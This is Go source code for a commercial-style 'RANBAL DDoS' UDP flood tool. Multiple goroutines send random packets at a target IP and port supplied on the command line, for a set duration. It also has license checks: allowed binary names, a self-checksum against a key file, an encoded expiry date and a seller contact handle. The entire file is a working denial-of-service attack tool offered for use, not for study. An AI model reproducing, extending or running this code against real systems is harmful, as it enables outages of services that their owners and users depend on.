package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	encodedExpiryDate = "\x32\x30\x32\x34\x2D\x31\x31\x2D\x31\x37"
	dateFormat        = "2006-01-02"
	actualName        = "MyBinary"
)

func isAllowedName(actualName string, allowedNames []string) bool {
	for _, name := range allowedNames {
		if actualName == "./"+name || actualName == name {
			return true
		}
	}
	return false
}

func loadExpectedChecksum() (string, error) {
	file, err := os.Open("key.txt")
	if err != nil {
		return "", err
	}
	defer file.Close()

	var expectedChecksum string
	_, err = fmt.Fscanf(file, "%s", &expectedChecksum)
	if err != nil {
		return "", err
	}
	return expectedChecksum, nil
}

func calculateChecksum() (string, error) {
	file, err := os.Open(os.Args[0])
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := sha256.New()

	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}
	return hex.EncodeToString(hash.Sum(nil)), nil
}

func checkIntegrity(expectedChecksum string) {
	actualChecksum, err := calculateChecksum()
	if err != nil {
		fmt.Println("Error calculating checksum:", err)
		os.Exit(1)
	}

	if actualChecksum != expectedChecksum {
		fmt.Println("\nkey is not valid! or The binary has been modified!")
		fmt.Println("please contact to \033[1;3;4;31m@MrRanDom8\033[0m\n")
		os.Exit(1)
	}
}

func decodeHexDate(hex string) string {
	decoded := ""
	for i := 0; i < len(hex); i++ {
		value := int(hex[i])
		decoded += string(value)
	}
	return decoded
}

func checkExpiration() string {
	expiryDate := decodeHexDate(encodedExpiryDate)

	expiry, err := time.Parse(dateFormat, expiryDate)
	if err != nil {
		log.Fatalf("Error: Invalid expiry date format: %v", err)
	}

	if time.Now().Before(expiry) {

	} else {
		fmt.Println("\nThis binary has expired! Please contact \033[1;3;4;31m@MrRanDom8\033[0m\n")
		os.Exit(1)
	}
	return expiryDate
}

func showProgressBar(duration int) {

	startTime := time.Now()
	for {
		elapsed := time.Since(startTime).Seconds()
		percentage := int((elapsed / float64(duration)) * 100)

		if percentage > 100 {
			break
		}

		progress := fmt.Sprintf("COOLDOWN: %d SEC [%s]", duration-int(elapsed), getArrowProgress(percentage))

		fmt.Printf("\r\033[K%s", progress)
		time.Sleep(100 * time.Millisecond)
	}
	fmt.Print("\r\033[K")
}

func getArrowProgress(percentage int) string {
	totalLength := 40 // Progress bar ki total length
	filledLength := (percentage * totalLength) / 100
	var bar string

	for i := 0; i < filledLength; i++ {
		bar += "\033[32m" + ">" + "\033[0m"
	}
	for i := filledLength; i < totalLength; i++ {
		bar += "."
	}
	return bar
}

func isLocalOrInvalidIP(ip string) bool {
	return ip == "0.0.0.0" || ip == "127.0.0.1" ||
		ip[:8] == "192.168." || ip[:7] == "10.0.0." ||
		ip[:7] == "172.16."
}

type ThreadData struct {
	ip       string
	port     int
	duration int
}

func generateRandomPayload() []byte {
	size := 2 + rand.Intn(2)
	payload := make([]byte, size)
	rand.Read(payload)
	return payload
}

func attack(data ThreadData, wg *sync.WaitGroup) {
	defer wg.Done()

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", data.ip, data.port))
	if err != nil {
		fmt.Println("Error resolving address:", err)
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Println("Error creating socket:", err)
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(time.Duration(data.duration) * time.Second)
	for time.Now().Before(endTime) {
		payload := generateRandomPayload()
		if _, err := conn.Write(payload); err != nil {
			fmt.Println("Send failed:", err)
			return
		}
	}
}

func usage() {
	fmt.Println("\nUsage: ./ranbal <ip> <port> <time> <threads>\n")
	os.Exit(1)
}
func stripColors(input string) string {

	re := regexp.MustCompile("\033\\[[0-9;]*m")
	return re.ReplaceAllString(input, "")
}

func main() {
	actualName := os.Args[0]

	allowedNames := []string{"rb", "ranbal", "balveer", "@MrRandom8"}

	if !isAllowedName(actualName, allowedNames) {
		fmt.Println("Warning: Invalid binary name! Allowed names are: rb, ranbal, balveer, @MrRandom8")
		fmt.Println("Please rename the file to one of the allowed names and try again.")
		os.Exit(1)
	}

	expectedChecksum, err := loadExpectedChecksum()
	if err != nil {
		fmt.Println("\nError: key.txt or key not found!! please contact to \033[1;3;4;31m@MrRanDom8\033[0m\n")
		os.Exit(1)
	}

	checkIntegrity(expectedChecksum)
	expiryDate := checkExpiration()
	text := fmt.Sprintf("   \033[1;3;4;31mWELCOME BROTHER TO RANBAL DDoS\033[0m\n \033[1;4mVersion\033[0m : 1.0 [expiry: %s]", expiryDate)

	cleanText := stripColors(text)

	lines := strings.Split(cleanText, "\n")

	maxLength := 0
	for _, line := range lines {
		if len(line) > maxLength {
			maxLength = len(line)
		}
	}

	padding := 4
	boxWidth := maxLength + padding*2

	// Print top border
	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")

	for _, line := range strings.Split(text, "\n") {
		fmt.Printf("║" + strings.Repeat(" ", padding) + line + strings.Repeat(" ", boxWidth-len(stripColors(line))-padding*2) + "    ║\n")
	}

	// Print bottom border
	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")

	if len(os.Args) < 3 || len(os.Args) > 5 {
		usage()
	}

	ip := os.Args[1]
	port, _ := strconv.Atoi(os.Args[2])

	timeLimit := 2000
	threads := 3
	if len(os.Args) > 3 {
		timeLimit, _ = strconv.Atoi(os.Args[3])
	}
	if len(os.Args) == 5 {
		threads, _ = strconv.Atoi(os.Args[4])
	}

	fmt.Printf("\nAttack started on %s:%d for %d sec with %d threads\n\n", ip, port, timeLimit, threads)

	if isLocalOrInvalidIP(ip) {
		showProgressBar(timeLimit)
		fmt.Printf("\r\033[K")
		fmt.Println("Attack finished by \033[1;3;4;31m@Ranbal\033[0m")
		fmt.Println("Developer : \033[1;3;4;31mBALEER VAISHNAV\033[0m\n")
		os.Exit(1)
	}

	var wg sync.WaitGroup
	data := ThreadData{ip: ip, port: port, duration: timeLimit}

	go showProgressBar(timeLimit)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(data, &wg)
	}

	wg.Wait()
	fmt.Printf("\r\033[K")
	fmt.Println("Attack finished by \033[1;3;4;31m@Ranbal\033[0m")
	fmt.Println("Developer : \033[1;3;4;31mBALEER VAISHNAV\033[0m\n")
	os.Exit(2)
}
